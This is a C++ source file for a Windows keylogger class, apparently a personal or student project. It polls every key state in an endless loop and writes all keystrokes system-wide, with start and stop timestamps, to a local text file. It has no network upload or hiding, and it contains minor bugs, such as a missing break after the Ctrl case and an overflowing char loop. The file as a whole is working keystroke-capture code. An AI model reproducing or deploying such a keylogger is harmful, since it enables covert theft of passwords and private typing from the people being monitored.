//
// Created by avita on 25/02/2021.
//

#include "Keylogger.h"


Keylogger::Keylogger() {}


//DWORD WINAPI Keylogger::startThread() {
//    DWORD myThreadID;
//    HANDLE myHandle = ::CreateThread(0, 0, startKeylogger, 0, 0, &myThreadID);
//    return 0;
//}


void Keylogger::writeKeyToFile(char key) {
    hWindowHandle = GetForegroundWindow(); //Getting handle to the focus window
    threadId = GetWindowThreadProcessId(hWindowHandle, NULL); //Getting the thread Id of the focus window thread
    kState = (BYTE *) malloc(256);
    GetKeyboardState(kState); //Getting the keyboard state and saving it in kState
    hkl = GetKeyboardLayout(threadId);
    wchar_t UniChar[2] = {0}; //The size of wchar_t is 2 bytes
    ToUnicodeEx(key, key, (BYTE *) kState, UniChar, 2, NULL, hkl); //Converting key to unicode in
    file << UniChar;
    free(kState);
}

bool Keylogger::deleteKeyloggerData() {
    file.flush();
    file.close();
    file.open("C:\\C_projects\\Keylogger.txt");
    if (!file.is_open())
        return false;
    return true;
}


int Keylogger::startKeylogger() {
    Keylogger keylogger = Keylogger();

   keylogger.file.open("C:\\C_projects\\Keylogger.txt"); //open the file in unicode mode


    //Checking if the file is open
    if (!keylogger.file.is_open()) {
        cerr << "Cant open the file (Constructor)" << endl;
        return -1;
    }
    SYSTEMTIME st;
    ::GetLocalTime(&st);
    cout << "Keylogger::startKeylogger():start:" << st.wMilliseconds << endl;
    bool capsLock = GetKeyState(VK_CAPITAL); //Checking if the capsLock is on or off
    keylogger.file.imbue(keylogger.utf8_locale);

    char key;
    keylogger.file << "The Keylogger has started The Date is " << st.wDay << "." << st.wMonth << "." << st.wYear
                   << " And the Time is "
                   << st.wHour << ":" << st.wMinute << ":" << st.wSecond << endl;
    while (true) {
        Sleep(10);
        for (key = 8; key <= 256; key++) {

            if (GetAsyncKeyState(key) == -32767) {

                switch (key) {
                    case VK_SPACE:
                        keylogger.file << ' ';
                        break;
                    case VK_RETURN:
                        keylogger.file << '\n';
                        break;
                    case VK_BACK:
                        keylogger.file << "[BACKSPACE]";
                        break;
                    case VK_CAPITAL:
                        capsLock = !capsLock;
                        break;
                    case VK_SHIFT:
                        keylogger.file << "[SHIFT]";
                        break;
                    case VK_CONTROL:
                        keylogger.file << "[CTRL]";
                    case VK_ESCAPE:
                        keylogger.file << "[ESCAPE]";
                        break;
                    case VK_MENU:
                        keylogger.file << "[ALT]";
                        break;
                    case VK_TAB:
                        keylogger.file << "[TAB]";
                        break;
                    case VK_F12:
                        cout << "F12 was pressed quitting" << endl;
                        ::GetLocalTime(&st);
                        keylogger.file << "\nThe Keylogger has closed The Date is " << st.wDay << "." << st.wMonth
                                       << "."
                                       << st.wYear
                                       << " And the Time is " << st.wHour << ":" << st.wMinute << ":" << st.wSecond
                                       << endl;
                        keylogger.file.flush();
                        keylogger.file.close();
                        return 1;
                    case VK_F1:
                    case VK_F2:
                    case VK_F3:
                    case VK_F4:
                    case VK_F5:
                    case VK_F6:
                    case VK_F7:
                    case VK_F8:
                    case VK_F9:
                    case VK_F10:
                    case VK_F11:
                    case VK_DELETE:
                    case VK_LWIN:
                    case VK_RWIN:
                    case VK_PRINT:
                    case VK_LBUTTON:
                    case VK_RBUTTON:
                    case VK_SNAPSHOT:
                    case VK_INSERT:
                    case VK_HELP:
                    case VK_LEFT:
                    case VK_UP:
                    case VK_RIGHT:
                    case VK_DOWN:
                    case VK_HOME:
                    case VK_END:
                    case VK_PRIOR:
                    case VK_NEXT:
                    case VK_PAUSE:
                    case VK_MEDIA_PLAY_PAUSE:
                    case VK_MEDIA_STOP:
                    case VK_MEDIA_NEXT_TRACK:
                    case VK_MEDIA_PREV_TRACK:
                    case VK_SCROLL:
                    case VK_PLAY:
                    case VK_NUMLOCK:
                        break;
                    default:
                        if (capsLock)
                            keylogger.file << key;
                        else
                            keylogger.writeKeyToFile(key);
                }
            }
        }
    }
    ::GetLocalTime(&st);
    keylogger.file << "\nThe Keylogger closed The Date is " << st.wDay << "." << st.wMonth << "." << st.wYear
                   << " And the Time is "
                   << st.wHour << ":" << st.wMinute << ":" << st.wSecond << endl;
    keylogger.file.flush();
    keylogger.file.close();
    return 1;
}